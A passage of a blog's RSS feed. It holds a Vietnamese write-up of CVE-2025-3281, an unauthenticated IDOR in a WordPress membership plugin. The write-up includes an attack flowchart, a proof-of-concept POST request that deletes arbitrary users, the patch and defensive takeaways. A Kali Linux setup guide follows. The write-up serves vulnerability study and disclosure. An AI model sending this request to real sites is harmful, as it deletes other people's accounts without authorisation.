cả:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_ajax_user_registration_membership_create_stripe_subscription&#xA;wp_ajax_nopriv_user_registration_membership_create_stripe_subscription&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_*&lt;/code&gt; → cho người dùng đã đăng nhập&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; → cho người dùng &lt;strong&gt;chưa đăng nhập (unauthenticated)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Vì vậy, &lt;strong&gt;bất kỳ ai cũng có thể gửi request tới endpoint này&lt;/strong&gt;, kể cả attacker chưa xác thực. Khi request được gửi:&lt;/p&gt;&#xA;&lt;p&gt;Kết quả là action &lt;code&gt;create_stripe_subscription&lt;/code&gt; trở thành &lt;strong&gt;điểm khai thác IDOR&lt;/strong&gt;, cho phép &lt;strong&gt;xóa bất kỳ user nào&lt;/strong&gt; được tạo qua plugin, ngay cả khi attacker không đăng nhập.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Send POST request to admin-ajax.php?action=user_registration_membership_create_stripe_subscription&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;WordPress routes request via wp_ajax_nopriv_*&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;create_stripe_subscription() executed&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Read POST parameters (member_id, customer_id, payment_method_id)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Check get_user_meta(member_id, &amp;#39;urm_user_just_created&amp;#39;)&amp;#34;]&#xA;&#xA;F --&amp;gt;|Not exists| G[&amp;#34;Request rejected&amp;#34;]&#xA;F --&amp;gt;|Exists| H[&amp;#34;Call create_subscription()&amp;#34;]&#xA;&#xA;H --&amp;gt; I{&amp;#34;Stripe subscription valid?&amp;#34;}&#xA;&#xA;I --&amp;gt;|Yes| J[&amp;#34;Return success response&amp;#34;]&#xA;I --&amp;gt;|No| K[&amp;#34;wp_delete_user(member_id)&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Target user deleted&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Truy cập &lt;code&gt;/membership-registration/?&lt;/code&gt; và lấy giá trị của &lt;code&gt;_confirm_payment_nonce&lt;/code&gt; từ response&lt;/li&gt;&#xA;&lt;li&gt;Gửi request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: wordpress_test_cookie=WP%20Cookie%20check; isSidebarEnabled=true; __stripe_mid=f13365af-449c-4412-b77c-7213da0dbe814d9925; __stripe_sid=7323a342-4cac-4124-9d98-a02abd109a8cd8d073; wp_lang=en_US&#xA;&#xA;action=user_registration_membership_create_stripe_subscription&amp;amp;_ajax_nonce=472f729de7&amp;amp;member_id=member_id_to_delete&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-3281&lt;/strong&gt; xuất phát từ việc hàm &lt;code&gt;create_stripe_subscription()&lt;/code&gt; cho phép truy cập không xác thực trong khi lại xử lý trực tiếp dữ liệu nhạy cảm do người dùng kiểm soát. Việc thiếu kiểm tra quyền đối với &lt;code&gt;member_id&lt;/code&gt;, kết hợp với việc endpoint được expose qua &lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt;, đã tạo điều kiện để attacker xóa tài khoản người dùng một cách trái phép.&#xA;Bản vá ở phiên bản 4.2.2 đã khắc phục vấn đề bằng cách bổ sung kiểm tra quyền (&lt;code&gt;current_user_can&lt;/code&gt;), ngăn chặn hoàn toàn hành vi IDOR.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nonce không thay thế cho kiểm tra quyền truy cập.&lt;/li&gt;&#xA;&lt;li&gt;Các endpoint &lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; cần được kiểm soát chặt chẽ.&lt;/li&gt;&#xA;&lt;li&gt;Không nên thực hiện hành động nhạy cảm (xóa user, thay đổi trạng thái) chỉ dựa trên dữ liệu từ client.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra quyền (&lt;code&gt;current_user_can&lt;/code&gt;) là bắt buộc khi thao tác với tài nguyên người dùng.&lt;/li&gt;&#xA;&lt;li&gt;IDOR thường xuất hiện khi business logic thiếu ràng buộc về quyền, không chỉ do lỗi kỹ thuật đơn thuần.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/user-registration/vulnerability/wordpress-user-registration-membership-plugin-4-2-1-insecure-direct-object-reference-to-unauthenticated-limited-user-deletion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin &amp;lt;= 4.2.1 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Setup Kali Linux For Pentest</title>
      <link>http://localhost:1313/vi/posts/2025-12-25-setup-kali-for-pentest/</link>
      <pubDate>Thu, 25 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-25-setup-kali-for-pentest/</guid>
      <category domain="http://localhost:1313/vi/categories/pentest/">Pentest</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-25-setup-kali-for-pentest/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;update--upgrade&#34;&gt;&lt;span&gt;Update &amp;amp; Upgrade&lt;/span&gt;&#xA;  &lt;a href=&#34;#update--upgrade&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt update -y &amp;amp;&amp;amp; sudo apt update -y &amp;amp;&amp;amp; sudo apt full-upgrade -y&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;download-fcitx5-unikey&#34;&gt;&lt;span&gt;Download Fcitx5 Unikey&lt;/span&gt;&#xA;  &lt;a href=&#34;#download-fcitx5-unikey&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install fcitx5 fcitx5-unikey fcitx5-config-qt fcitx5-frontend-gtk3 fcitx5-frontend-gtk2 -y&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Config&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;fcitx5-configtool&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;download-vscode&#34;&gt;&lt;span&gt;Download VSCode&lt;/span&gt;&#xA;  &lt;a href=&#34;#download-vscode&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Download từ &lt;a href=&#34;https://code.visualstudio.com/download&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://code.visualstudio.com/download&lt;/a&gt; hoặc sử dụng terminal:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wget -O vscode.deb &amp;#34;https://code.visualstudio.com/sha/download?build=stable&amp;amp;os=linux-deb-x64&#xA;sudo apt install ./vscode.deb&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;download-hugo-for-blog&#34;&gt;&lt;span&gt;Download Hugo for Blog&lt;/span&gt;&#xA;  &lt;a href=&#34;#download-hugo-for-blog&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tải về&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;wget https://github.com/gohugoio/hugo/releases/download/v0.153.0/hugo_extended_0.153.0_linux-amd64.tar.gz&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Giải nén và cài&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;tar -xvzf hugo_extended_*_linux-amd64.tar.gz&#xA;sudo mv hugo /usr/local/bin/&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;remove-underline-in-zsh&#34;&gt;&lt;span&gt;Remove Underline in Zsh&lt;/span&gt;&#xA;  &lt;a href=&#34;#remove-underline-in-zsh&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;(( ${&amp;#43;ZSH_HIGHLIGHT_STYLES} )) || typeset -A ZSH_HIGHLIGHT_STYLES&#xA;ZSH_HIGHLIGHT_STYLES[path]=none&#xA;ZSH_HIGHLIGHT_STYLES[path_prefix]=none&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Thay đổi tất cả từ &lt;code&gt;underline&lt;/code&gt; thành &lt;code&gt;none&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;-ZSH_HIGHLIGHT_STYLES[unknown-token]=underline&#xA;&amp;#43;ZSH_HIGHLIGHT_STYLES[unknown-token]=none&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;eza-for-ls-ouput&#34;&gt;&lt;span&gt;&lt;code&gt;eza&lt;/code&gt; for &lt;code&gt;ls&lt;/code&gt; ouput&lt;/span&gt;&#xA;  &lt;a href=&#34;#eza-for-ls-ouput&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tải&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install eza&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Cấu hình&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias ls=&amp;#39;eza --group-directories-first&amp;#39;&#xA;alias ll=&amp;#39;eza -lah --group-directories-first&amp;#39;&#xA;alias la=&amp;#39;eza -a --group-directories-first&amp;#39;&#xA;alias lt=&amp;#39;eza --tree --group-directories-first&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;grc-for-color-output&#34;&gt;&lt;span&gt;&lt;code&gt;grc&lt;/code&gt; for Color Output&lt;/span&gt;&#xA;  &lt;a href=&#34;#grc-for-color-output&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tải&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install grc -y&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Cấu hình&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;# Auto alias commands supported by grc (except ls)&#xA;if command -v grc &amp;gt;/dev/null; then&#xA;  for f in /usr/share/grc/conf.*; do&#xA;    cmd=&amp;#34;${f##*/conf.}&amp;#34;  &#xA;    [ &amp;#34;$cmd&amp;#34; = &amp;#34;ls&amp;#34; ] &amp;amp;&amp;amp; continue&#xA;    alias &amp;#34;$cmd=grc $cmd&amp;#34;&#xA;  done&#xA;fi&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;fzf--fuzzy-finder&#34;&gt;&lt;span&gt;&lt;code&gt;fzf&lt;/code&gt; – fuzzy finder&lt;/span&gt;&#xA;  &lt;a href=&#34;#fzf--fuzzy-finder&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install fzf&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;bat-for-read-file&#34;&gt;&lt;span&gt;&lt;code&gt;bat&lt;/code&gt; for Read File&lt;/span&gt;&#xA;  &lt;a href=&#34;#bat-for-read-file&#34; 